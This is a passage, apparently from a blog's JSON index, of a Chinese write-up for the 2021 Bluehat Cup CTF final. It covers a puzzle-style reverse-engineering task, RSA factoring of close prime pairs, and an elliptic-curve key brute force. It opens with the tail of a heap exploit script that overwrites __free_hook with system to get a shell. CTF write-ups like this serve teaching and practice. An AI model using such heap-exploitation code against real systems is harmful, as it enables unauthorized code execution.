\u0026#39;Chunk_1\\n\u0026#39;) show(2) libc.address = u64(rv(6) + b\u0026#39;\\x00\u0026#39;*2) - 0x3ebca0 log.warning(hex(libc.address)) free_hook = libc.sym[\u0026#39;__free_hook\u0026#39;] edit(0, 0x80000000, b\u0026#39;\\x01\u0026#39;*(12+0x80)+p64(free_hook)*0x60 + b\u0026#39;\\n\u0026#39;) add(0xd8, p64(libc.sym[\u0026#39;system\u0026#39;]) + b\u0026#39;\\n\u0026#39;) free(4) p.interactive() Re abc 动调，发现输入主要是进入一个case语句\n__int64 __fastcall sub_401406() { char *v0; // rax  int v1; // ecx  v1 = *v0; switch ( v1 ) { case \u0026#39;#\u0026#39;: // 右  return sub_400A65(); case \u0026#39;$\u0026#39;: // 上  return sub_40085B(); case \u0026#39;%\u0026#39;: // 左  return sub_400B6D(); case \u0026#39;@\u0026#39;: // 下  return sub_40095D(); } sub_4013EE(); return sub_400C6F(); } 分别查看四个函数，发现主要是将内存中的-1与另一个数据进行交换\n最后的验证逻辑为\nv10 = __ROR4__(__ROL4__(0x75DFBD5B, 15) ^ 0xDEADBEEF, 10);// 1  for ( i = v10; i \u0026lt; 15; i = i - 84 + 85 ) { sub_400CBA(); if ( box[i] - box[i - 1] != 1 ) v10 = __ROR4__(__ROL4__(0x7DDFBD5B, 15) ^ 0xDEADBEEF, 10); } 内存中总共有16个数字，猜测是一个十六格的拼图\n1, A, 2, 3, 5, D, 6, 4, 9,-1, 7, B, E, F, C, 8\r其中-1可以上下左右交换位置\n手动解一下，远程验证\n$$##@@%%$##@@%$$#@%%%@#$%@##$%%@##$%@#$#@\rexecutable_pyc 工具还原字节码，根据字节码手动恢复出python脚本，得到加密逻辑\ndef e2(m): assert type(m) == bytes l = len(m) // 2 m1 = s2n(m[:l]) m2 = s2n(m[l:]) p = gen_prime(1024) q = gen_prime(1024) pp = g.next_prime(p + 2333) qq = g.next_prime(q + 2333) e = g.next_prime(65535) ee = g.next_prime(e) n = p * q nn = pp * qq c1 = n2s(pow(m1, e, n)) c2 = n2s(pow(m2, ee, nn)) print (str(n), nn.digits(), (c1 + c2).hex()) 后面就是解密码题了，需要找出p和q\n因为素数的频率大概在​ $\\ln(n)$ 的时间复杂度，所以​ $pp$ 和 $p$ ​以及 $qq$ ​和 $q$ ​的差距很小，大概在 $​p+2333+\\ln(p)$ 附近。\n所以让 $pp=p+x, qq=q+y$​。有 $n=pq, nn=pp*qq=(p+x)(q+x)=n+py+qx+xy$\n让 $dn=nn-n=py+qx+xy=py+xn/p+xy$​，有 $yp^2+(xy-dn)p+xn=0​$\n如果让 $​p$ 有解，则让 $\\Delta=(xy-dn)^2-4xyn=x^2y^2-2\\cdot dn\\cdot xy+(dn)^2-4xyn\u0026gt;0$ ​且能够保证 $\\Delta$​开出整数方根。函数如下\ndef qiugen(x, y, dn): cur = x ** 2 * y ** 2 + dn ** 2 - 2 * dn * x * y - 4 * x * y * n cur_root = root(cur, 2) if cur_root ** 2 == cur: up = dn - x * y + cur_root if up % (2 * y) == 0: ans = up // (2 * y) return ans return -1 然后开始遍历​x,y，考虑到素数频率，可以大致确定x,y范围为[2333, 2333+1024]​。将其范围扩展到[2333, 4333]​。这样遍历的范围在4000000次qiugen函数运算。\n考虑到​nn确定，所以​x,y之间应该满足某种条件。​\n$\\Delta=x^2y^2-2dn\\cdot xy+(dn)^2-4xyn=h^2-(2dn+4n)h+(dn)^2$，其中$h=xy$​。如果需要让​$\\Delta\u0026gt;0$，需要$h\u0026lt;dn+2n-2*sqrt(dn\\cdot n+n^2)$，约为6174696​。\n所以可以令x遍历[2333,4333]，令y遍历[2333,6174696/x]​，即可找到真正的​x,y。即可得到p,q,pp,qq​。\nfrom Qmath import root from libnum import * from gmpy2 import next_prime ​ n = 10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593056153329019331663146921270200309620591339456771948171473174493228003768777355758929283942611167959313149646888081882056633536206394514157657102927145569575772516981907153659054180860331268989018643271316833183194539111739812416472551511615664022982639779869597584768094658974144703654232643726744397158318139843 nn = 10300808326934539089496666241808264289631957459372648156286399524715435483257526083909012656240599916663153630994400397551123967736269088895097145175999170121832669199408651009327424481969614347720526807144751032787049942449153321489493089722581323461987069958785112077070200328522919094221696573840593061197309859493502461339998035893727381543475878482841368750058482267744297318087515308976122481608145274938058888809506400916026737269420025654685431401793700398817215185170304169141953786566489760847593258253794575454082327627379713144072687287826518630644255675609067675836382036436064703619178779628644141463 cipher = 0x22cca5150ca0bb2132f68302dc7441e52b91ae7252e44cc13ed83e58253a9aaaa55e095ba36748dff7ea21fff553f8c4656e77a508b64da054f1381b7e2d0600bcec6ed9e1cc8d14c2362aaef7a972a714f88e5afb2d39ed77d0c22a449ca2cfb0802c138f20e0ecbd3c174151cdb8e8ca6d89aa3c503615ebfbc851af5ac51dcfa8b5869b775b57a27b9e4346979180d89b303cae2c5d9e6cabb3c9947837bd8f92333532d4b54dd72ea35400060006328f6f4329147df195ec78a7ab9d39973ce0fd6511e7a0de54737bee64476ba531604f0375b08adf7d768c41ba9e2ba88468d126561a134de79dc0217c1c56d219ca6747103618e46f35281feb9e6050c93e32e26e21ee2c3495f60db2fad9f9a5c570c9f97aee698024ebff6163ef26e32958872db7c593d7f41f90981b8db45aa01085be1e61f7603ecf3d5c032dd90dea791cd9825299548c0cbe7dadabc157048a7fd5cd4bcb1cfeaf0bd2d679f66cb0b1c33ec04bd20317f872c85d500a3475833f983fdee59b3f61a731e2a8b9a60bd7d840f46e97f06dd4fd8ad1cb4d13a82da01938801c33835ceaf34e1cf62ebdde7ac68b17c2a236b64ffacd2a0e7258571ce570871aea9f309df63c0a3abcfa0c05d159a82f9fa3f3ad73944e4ae33c3432c8b65c0d6fe9b560220b14abe5886188fc1e6afa4bb4395669618387224422acf20b519af902225e270 ​ dn = nn - n ​ def qiugen(x, y, dn): cur = x ** 2 * y ** 2 + dn ** 2 - 2 * dn * x * y - 4 * x * y * n cur_root = root(cur, 2) if cur_root ** 2 == cur: up = dn - x * y + cur_root if up % (2 * y) == 0: ans = up // (2 * y) return ans return -1 ​ ​ for x in range(4333, 2333, -1): if (x - 2333) % 100 == 0: print x for y in range(6174700 // x, 2332, -1): cur_ans = qiugen(x, y, dn) if cur_ans != -1: print cur_ans if n % cur_ans == 0: p = cur_ans q = n // p print cur_ans pp = next_prime(p + 2333) qq = next_prime(q + 2333) print (n2s(pow(c1, invmod(0x10001, (p - 1) * (q - 1)), p * q))) print (n2s(pow(c2, invmod(0x10003, (pp - 1) * (qq - 1)), pp * qq))) Crypto crack point 已知椭圆曲线正常加密，key的位数过小，大步小步法爆破2的39次方到2的40次方寻找key=436370150383，算出\npoint2 = (54874480268135442592960451774606422130 : 54593336491331150503709607435043296744 : 1)\nflag = cipher - point_2得到最终点\n","date":"2021-11-05T16:23:41+08:00","permalink":"https://or4ngesec.github.io/post/bluehat-final-writeup/","title":"2021蓝帽杯决赛 Writeup"}]